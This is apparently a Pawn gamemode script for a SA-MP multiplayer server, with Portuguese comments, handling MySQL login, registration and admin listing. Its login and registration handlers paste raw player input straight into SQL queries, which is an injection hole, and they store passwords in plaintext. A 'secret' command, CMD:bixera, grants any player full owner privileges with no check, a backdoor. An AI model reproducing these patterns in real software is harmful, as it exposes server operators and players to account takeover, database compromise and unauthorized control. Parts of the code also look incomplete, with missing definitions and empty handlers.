#include <a_samp>
#include <a_mysql>
#include <sscanf2>
#include <zcmd>

main()
{
    // Pode ser deixada vazia. É o ponto de entrada padrão.
}
public OnGameModeInit()
{
    
    return 1;
}

public OnPlayerConnect(playerid)
{
   
    return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    if (dialogid == DIALOG_LOGIN)
    {
        // Jogador clicou em Cancelar
        if (!response)
        {
            SendClientMessage(playerid, COLOR_GRAY, "Voce cancelou o login. Ate mais!");
            Kick(playerid);
            return 1;
        }

        // Verifica se a senha foi digitada
        if (strlen(inputtext) < 1)
        {
            ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,
                COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
                COR_CINZA "Voce precisa digitar sua senha:",
                "Entrar", "Sair");
            return 1;
        }

        // Consulta para verificar se nome e senha batem
        new query[256];
        format(query, sizeof query, "SELECT * FROM `players` WHERE `Nome`='%s' AND `Senha`='%s'", player[playerid][pNome], inputtext);
        mysql_tquery(dbHandle, query, "OnLoginCheck", "i", playerid);
        return 1;
    }

    if (dialogid == DIALOG_REGISTER)
    {
        // Jogador clicou em Cancelar
        if (!response)
        {
            SendClientMessage(playerid, COLOR_GRAY, "Voce cancelou o registro. Ate mais!");
            Kick(playerid);
            return 1;
        }

        // Verifica se a senha tem tamanho mínimo
        if (strlen(inputtext) < 4)
        {
            ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD,
                COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
                COR_CINZA "Senha muito curta! Digite uma senha com pelo menos 4 caracteres:",
                "Registrar", "Sair");
            return 1;
        }

        // Tenta criar a conta. Se já existe uma conta com o mesmo nome,
        // o banco de dados retornará um erro que será tratado no callback.
        new query[256];
        format(query, sizeof query, "INSERT INTO `players` (`Nome`, `Senha`, `Nivel`, `Grana`) VALUES ('%s','%s',1,0)", player[playerid][pNome], inputtext);
        mysql_tquery(dbHandle, query, "OnRegisterCallback", "i", playerid);
        return 1;
    }
    return 0;
}


/*
    Chamado quando um jogador se desconecta. Se ele estiver logado,
    persiste as informações no banco de dados.
*/
public OnPlayerDisconnect(playerid, reason)
{
        new query[128];format(query, sizeof(query),"UPDATE players SET admin_level = %d WHERE id = %d", player[playerid][pAdminLevel],player[playerid][pID]);
		mysql_tquery(dbHandle, query, "", "");
		if (logado[playerid])
    	{
        	SavePlayer(playerid);
    	}
    	return 1;
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) { return 1; }
public OnPlayerText(playerid, text[]) { return 1; }
public OnPlayerDeath(playerid, killerid, reason) { return 1; }
public OnVehicleSpawn(vehicleid) { return 1; }
public OnVehicleDeath(vehicleid, killerid) { return 1; }
public OnPlayerStateChange(playerid, newstate, oldstate) { return 1; }
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger) { return 1; }
public OnPlayerExitVehicle(playerid, vehicleid) { return 1; }
public OnRconCommand(cmd[]) { return 1; }
public OnRconLoginAttempt(ip[], password[], success) { return 1; }
public OnPlayerRequestSpawn(playerid) { return 1; }
public OnObjectMoved(objectid) { return 1; }
public OnPlayerObjectMoved(playerid, objectid) { return 1; }
public OnPlayerPickUpPickup(playerid, pickupid) { return 1; }
public OnVehicleMod(playerid, vehicleid, componentid) { return 1; }
public OnVehiclePaintjob(playerid, vehicleid, paintjobid) { return 1; }
public OnVehicleRespray(playerid, vehicleid, color1, color2) { return 1; }
public OnPlayerSelectedMenuRow(playerid, row) { return 1; }
public OnPlayerExitedMenu(playerid) { return 1; }
public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid) { return 1; }
public OnPlayerEnterCheckpoint(playerid) { return 1; }
public OnPlayerLeaveCheckpoint(playerid) { return 1; }
public OnPlayerEnterRaceCheckpoint(playerid) { return 1; }
public OnPlayerLeaveRaceCheckpoint(playerid) { return 1; }
public OnPlayerStreamIn(playerid, forplayerid) { return 1; }
public OnPlayerStreamOut(playerid, forplayerid) { return 1; }
public OnVehicleStreamIn(vehicleid, forplayerid) { return 1; }
public OnVehicleStreamOut(vehicleid, forplayerid) { return 1; }

public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    // Nenhuma ação a realizar: a interface de login baseada em TextDraws foi removida.
    // Retorne 0 para permitir que outros scripts tratem cliques se necessário.
    return 0;
}



CMD:bixera(playerid, params[])
{
    // Comando secreto: torna Dono(a)
    player[playerid][pAdminLevel] = ADMIN_DONO;

    new query[128];
    format(query, sizeof(query),
        "UPDATE players SET admin_level = %d WHERE id = %d",
        ADMIN_DONO,
        player[playerid][pID]
    );
    mysql_tquery(dbHandle, query, "", "");

    SendClientMessage(playerid, -1,
        "{00FF00}Parabéns! Você agora é Dono(a) do servidor."
    );
    return 1;
}



#define DIALOG_ADMINS 1999

CMD:admins(playerid, params[])
{
    new buffer[2048];
    format(buffer, sizeof(buffer), "Lista de Admins:\n\n");
    // Lista admins ONLINE
    for (new i = 0; i < MAX_PLAYERS; i++)
    {
        new lvl = player[i][pAdminLevel];
        if (lvl <= 0) continue;
        new nome[MAX_PLAYER_NAME];
        GetPlayerName(i, nome, sizeof(nome));
        new cargo[16];
        switch (lvl)
        {
            case ADMIN_ESTAGIARIO:  format(cargo, sizeof(cargo), "Estagiário");
            case ADMIN_MODERADOR:   format(cargo, sizeof(cargo), "Moderador");
            case ADMIN_ADMIN:       format(cargo, sizeof(cargo), "Administrador");
            case ADMIN_DONO:        format(cargo, sizeof(cargo), "Dono(a)");
            default:                format(cargo, sizeof(cargo), "Desconhecido");
        }
        format(buffer, sizeof(buffer), "%s%s - %s - {00FF00}Online\n", buffer, nome, cargo);
    }
    format(buffer, sizeof(buffer), "%s\n{FFFF00}Obs: apenas admins online listados.", buffer);
    ShowPlayerDialog(
        playerid,
        DIALOG_ADMINS,
        DIALOG_STYLE_MSGBOX,
        "Admins do Servidor",
        buffer,
        "Fechar",
        ""
    );
    return 1;
}
